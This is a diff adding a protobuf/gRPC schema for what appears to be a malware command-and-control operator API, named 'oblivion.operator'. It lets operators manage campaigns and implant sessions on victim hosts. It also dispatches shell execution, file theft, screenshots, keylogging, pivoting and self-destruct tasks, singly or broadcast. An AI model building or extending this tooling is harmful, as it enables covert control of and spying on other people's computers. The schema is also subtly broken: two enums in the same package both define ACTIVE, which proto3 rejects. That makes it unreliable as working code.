@@ -1,0 +1,246 @@
+syntax = "proto3";
+package oblivion.operator;
+
+import "google/protobuf/struct.proto";
+
+service Operator {
+    // Campaign Management
+    rpc CreateCampaign(CreateCampaignRequest) returns (Campaign);
+    rpc ListCampaigns(ListCampaignsRequest) returns (ListCampaignsResponse);
+    rpc GetCampaign(GetCampaignRequest) returns (CampaignDetails);
+    rpc ControlCampaign(ControlCampaignRequest) returns (ControlCampaignResponse);
+    
+    // Session Management
+    rpc ListSessions(ListSessionsRequest) returns (ListSessionsResponse);
+    rpc GetSession(GetSessionRequest) returns (SessionDetails);
+    rpc TerminateSession(TerminateSessionRequest) returns (TerminateSessionResponse);
+    
+    // Task Management
+    rpc CreateTask(CreateTaskRequest) returns (CreateTaskResponse);
+    rpc CreateBroadcastTask(CreateBroadcastTaskRequest) returns (CreateBroadcastTaskResponse);
+    rpc GetTaskResult(GetTaskResultRequest) returns (TaskResult);
+    rpc CancelTask(CancelTaskRequest) returns (CancelTaskResponse);
+    
+    // Real-time Events
+    rpc SubscribeEvents(SubscribeEventsRequest) returns (stream Event);
+    
+    // Server Info
+    rpc GetServerStats(GetServerStatsRequest) returns (ServerStats);
+}
+
+message CreateCampaignRequest {
+    string name = 1;
+    string description = 2;
+    google.protobuf.Struct metadata = 3;
+}
+
+message Campaign {
+    string id = 1;
+    string name = 2;
+    string description = 3;
+    string operator_id = 4;
+    int32 status = 5;
+    string created_at = 6;
+    optional string started_at = 7;
+    optional string ended_at = 8;
+}
+
+enum CampaignStatus {
+    PLANNING = 0;
+    ACTIVE = 1;
+    PAUSED = 2;
+    CLOSING = 3;
+    ARCHIVED = 4;
+}
+
+message ListCampaignsRequest {
+    bool include_archived = 1;
+}
+
+message ListCampaignsResponse {
+    repeated Campaign campaigns = 1;
+}
+
+message GetCampaignRequest {
+    string campaign_id = 1;
+}
+
+message CampaignDetails {
+    Campaign campaign = 1;
+    repeated Session sessions = 2;
+    CampaignStatistics statistics = 3;
+}
+
+message CampaignStatistics {
+    uint32 total_sessions = 1;
+    uint32 active_sessions = 2;
+    uint32 stale_sessions = 3;
+    uint32 terminated_sessions = 4;
+    uint64 duration_seconds = 5;
+}
+
+message ControlCampaignRequest {
+    string campaign_id = 1;
+    CampaignAction action = 2;
+}
+
+enum CampaignAction {
+    START = 0;
+    PAUSE = 1;
+    CLOSE = 2;
+    ARCHIVE = 3;
+}
+
+message ControlCampaignResponse {
+    bool success = 1;
+}
+
+message Session {
+    string id = 1;
+    string campaign_id = 2;
+    string hostname = 3;
+    string username = 4;
+    string os_version = 5;
+    uint32 process_id = 6;
+    string first_seen = 7;
+    string last_seen = 8;
+    int32 status = 9;
+}
+
+enum SessionStatus {
+    ACTIVE = 0;
+    IDLE = 1;
+    STALE = 2;
+    TERMINATED = 3;
+}
+
+message ListSessionsRequest {
+    string campaign_id = 1;
+    int32 status_filter = 2;
+}
+
+message ListSessionsResponse {
+    repeated Session sessions = 1;
+}
+
+message GetSessionRequest {
+    string session_id = 1;
+}
+
+message SessionDetails {
+    Session session = 1;
+    repeated TaskBrief recent_tasks = 2;
+}
+
+message TerminateSessionRequest {
+    string session_id = 1;
+    bool wipe_implant = 2;
+}
+
+message TerminateSessionResponse {
+    bool success = 1;
+}
+
+message CreateTaskRequest {
+    string campaign_id = 1;
+    string session_id = 2;
+    TaskType task_type = 3;
+    bytes payload = 4;
+    uint32 timeout_seconds = 5;
+}
+
+enum TaskType {
+    SHELL_EXEC = 0;
+    FILE_UPLOAD = 1;
+    FILE_DOWNLOAD = 2;
+    PROCESS_LIST = 3;
+    SCREENSHOT = 4;
+    KEYLOG_START = 5;
+    KEYLOG_STOP = 6;
+    PIVOT_SETUP = 7;
+    SELF_DESTRUCT = 99;
+}
+
+message CreateTaskResponse {
+    uint64 task_id = 1;
+    uint32 estimated_wait_seconds = 2;
+}
+
+message CreateBroadcastTaskRequest {
+    string campaign_id = 1;
+    repeated string session_ids = 2;
+    TaskType task_type = 3;
+    bytes payload = 4;
+    uint32 timeout_seconds = 5;
+}
+
+message CreateBroadcastTaskResponse {
+    repeated uint64 task_ids = 1;
+    uint32 target_count = 2;
+}
+
+message GetTaskResultRequest {
+    uint64 task_id = 1;
+}
+
+message TaskResult {
+    uint64 task_id = 1;
+    int32 status = 2;
+    optional bytes output = 3;
+    optional string error = 4;
+    optional string completed_at = 5;
+}
+
+enum TaskStatus {
+    PENDING = 0;
+    IN_PROGRESS = 1;
+    COMPLETED = 2;
+    FAILED = 3;
+    TIMEOUT = 4;
+    CANCELLED = 5;
+}
+
+message CancelTaskRequest {
+    uint64 task_id = 1;
+}
+
+message CancelTaskResponse {
+    bool cancelled = 1;
+}
+
+message SubscribeEventsRequest {
+    string campaign_id = 1;
+}
+
+message Event {
+    int32 event_type = 1;
+    optional Campaign campaign = 2;
+    repeated Session sessions = 3;
+    optional TaskBrief task = 4;
+    string timestamp = 5;
+}
+
+enum EventType {
+    CAMPAIGN_UPDATE = 0;
+    SESSION_CONNECT = 1;
+    SESSION_DISCONNECT = 2;
+    TASK_COMPLETE = 3;
+    SERVER_ALERT = 4;
+}
+
+message TaskBrief {
+    uint64 task_id = 1;
+    string session_id = 2;
+    int32 status = 3;
+}
+
+message GetServerStatsRequest {}
+
+message ServerStats {
+    uint32 active_sessions = 1;
+    uint32 total_campaigns = 2;
+    uint32 pending_tasks = 3;
+    uint32 active_tasks = 4;
+    uint64 uptime_seconds = 5;
+    string version = 6;
+}
